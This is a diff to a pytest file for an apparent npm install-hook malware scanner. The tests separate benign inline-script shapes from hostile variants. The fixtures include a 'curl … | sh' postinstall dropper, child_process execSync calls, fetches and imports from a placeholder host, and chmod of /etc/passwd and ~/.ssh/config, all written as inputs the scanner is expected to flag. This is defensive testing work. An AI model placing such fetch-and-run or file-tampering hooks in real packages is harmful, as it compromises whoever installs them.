@@ -81,7 +81,7 @@ class TestAnInlineProgramInAConsumerHook:
         [
             {"postinstall": "node -e \"console.log('thanks for installing')\""},
             {"preinstall": "python3 -c 'print(1)'"},
-            {"install": 'node -e "process.exit(0)"'},
+            {"install": 'node -e "process.exit(1)"'},
             {"postinstall": 'node -e "var x = 1 + 1; console.log(x)" && echo done'},
         ],
     )
@@ -205,6 +205,142 @@ class TestABannerIsNotAWayAroundTheShape:
         result = HookKit.result(tmp_path, hook)
         assert "MALWARE.DROPPER.001" in HookKit.rules(result)
         assert HookKit.blocks(result)
+
+
+class TestTheFewInlineProgramsThatDoNothingElse:
+    """Four closed shapes of inline program that legitimate packages write and that do nothing else are not a finding
+    (`InlineShapes`): a no-op exit, a Node version check, a chmod of the package's own file, and a guarded import of the
+    package's own file. Each is read by a closed token list, so a program that adds anything to one keeps the finding."""
+
+    @pytest.mark.parametrize(
+        ("hook", "extra"),
+        [
+            ({"postinstall": 'node -e "process.exit(0)"'}, {}),
+            (
+                {"postinstall": 'node dist/verify.js || node -e "process.exit(0)"'},
+                {"dist/verify.js": "1;\n"},
+            ),
+            (
+                {
+                    "preinstall": "node -e \"process.exit(process.version.slice(1).split('.')[0] < 18 ? 1 : 0)\" || echo needs node 18"
+                },
+                {},
+            ),
+            (
+                {
+                    "preinstall": (
+                        "node -e \"const major=Number(process.versions.node.split('.')[0]);if(major<20){"
+                        "console.error('needs Node 20 or newer; this is Node '+process.versions.node+'. Upgrade.');"
+                        'process.exit(1);}"'
+                    )
+                },
+                {},
+            ),
+            (
+                {
+                    "postinstall": "node -e \"try{require('fs').chmodSync('dist/index.js',0o755)}catch(e){}\""
+                },
+                {},
+            ),
+            (
+                {
+                    "postinstall": "node -e \"require('fs').chmodSync('bin/a.js',493);require('fs').chmodSync('bin/b.js',493)\""
+                },
+                {},
+            ),
+            (
+                {
+                    "postinstall": (
+                        "node -e \"try{require('fs').accessSync('dist/postinstall.js')}catch{process.exit(0)};"
+                        "import('./dist/postinstall.js')\" || exit 0"
+                    )
+                },
+                {"dist/postinstall.js": "export {};\n"},
+            ),
+            (
+                {
+                    "postinstall": "node -e \"require('fs').existsSync('dist/post.js')&&require('./dist/post.js')\""
+                },
+                {"dist/post.js": "1;\n"},
+            ),
+        ],
+    )
+    def test_the_shape_is_not_a_finding(
+        self, tmp_path: Path, hook: dict[str, str], extra: dict[str, str]
+    ) -> None:
+        result = HookKit.result(tmp_path, hook, **extra)
+        assert INLINE not in HookKit.rules(result)
+        assert UNREAD not in HookKit.rules(result)
+        assert not HookKit.blocks(result)
+
+    @pytest.mark.parametrize(
+        "program",
+        [
+            # a no-op that is not one
+            "process.exit(1)",
+            "process.exit(0);require('child_process').execSync('id')",
+            "process.exit(0),fetch('https://x.invalid/')",
+            "process.exit(0)//",
+            # a version check that does more, says an address, or hides a word
+            "if(process.version<'v18'){process.exit(1)}require('child_process').execSync('id')",
+            "if(process.version<'v18'){process.exit(1)}fetch('https://x.invalid/')",
+            "if(process.version<'v18'){console.error('see https://x.invalid/s');process.exit(1)}",
+            "if(process.version<'v18'){process.exit(1)}eval('1')",
+            "if(process.version<'v18'){process.exit(1)}process.env.X",
+            "if(process.version<'v18'){process.exit(1)}process.binding('x')",
+            "if(process.version<'v18'){process.exit(1)}console.log(`${process.env.T}`)",
+            "const f=require;if(process.version<'v18'){process.exit(1)}f('child_process')",
+            "if(process.version<'v18'){process.exit(1)}console['log']('x')",
+            "if(process.version<'v18'){process.exit(1)}process['mainModule']['require']('child_process')",
+            "if(process.version<'v18'){process.exit(1)}process[`x`]",
+            "if(process.version<'v18'){process.exit(1)}console.table(1)",
+            "process.version<'v18'",
+            "if(process.versions.node<'18'){console.log('old')}",
+            # a chmod that leaves the package, or does more
+            "require('fs').chmodSync('/etc/passwd',0o777)",
+            "require('fs').chmodSync('../x',0o777)",
+            "require('fs').chmodSync('~/.ssh/config',0o600)",
+            "require('fs').chmodSync('node_modules/.bin/x',0o755)",
+            "require('fs').chmodSync('a/../../b',0o755)",
+            "require('fs').chmodSync('dist/x.js',0o755);require('child_process').execSync('dist/x.js')",
+            "require('fs').chmodSync('dist/x.js',0o755);fetch('https://x.invalid/')",
+            "require('child_process').chmodSync('dist/x.js',0o755)",
+            "require('fs').chmodSync(process.env.X,0o755)",
+            "require('fs').chmodSync('dist/x.js',0o755).then(1)",
+            # a guarded import of something else, or of something outside the package
+            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('./dist/b.js')",
+            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('evil-package')",
+            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('/tmp/a.js')",
+            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('https://x.invalid/a.js')",
+            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(2)};import('./dist/a.js')",
+            "try{require('fs').accessSync('dist/a.js')}catch{require('child_process').execSync('id')};import('./dist/a.js')",
+            "try{require('fs').accessSync('../a.js')}catch{process.exit(0)};import('./../a.js')",
+            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('./dist/a.js');fetch('https://x.invalid/')",
+            "require('fs').existsSync('dist/a.js')&&require('./dist/b.js')",
+            "require('fs').existsSync('dist/a.js')&&require('dist/a.js')",
+        ],
+    )
+    def test_anything_added_or_moved_outside_the_package_keeps_the_finding(
+        self, tmp_path: Path, program: str
+    ) -> None:
+        result = HookKit.result(tmp_path, {"postinstall": f'node -e "{program}"'})
+        assert INLINE in HookKit.rules(result)
+        assert HookKit.blocks(result)
+
+    def test_a_shape_beside_shell_work_does_not_hide_it(self, tmp_path: Path) -> None:
+        hook = {"postinstall": 'node -e "process.exit(0)" && curl -s https://x.invalid/s | sh'}
+        result = HookKit.result(tmp_path, hook)
+        assert "MALWARE.DROPPER.001" in HookKit.rules(result)
+        assert HookKit.blocks(result)
+
+    def test_a_shape_beside_a_banner_keeps_the_finding_for_the_banner(self, tmp_path: Path) -> None:
+        hook = {"postinstall": 'node -e "process.exit(0)" && node -e "console.log(\'hello\')"'}
+        result = HookKit.result(tmp_path, hook)
+        assert INLINE in HookKit.rules(result)
+
+    def test_python_has_no_closed_shape(self, tmp_path: Path) -> None:
+        result = HookKit.result(tmp_path, {"postinstall": "python3 -c 'import sys; sys.exit(0)'"})
+        assert INLINE in HookKit.rules(result)
 
 
 class TestAHookThatRunsAFileTheScanDoesNotHold:
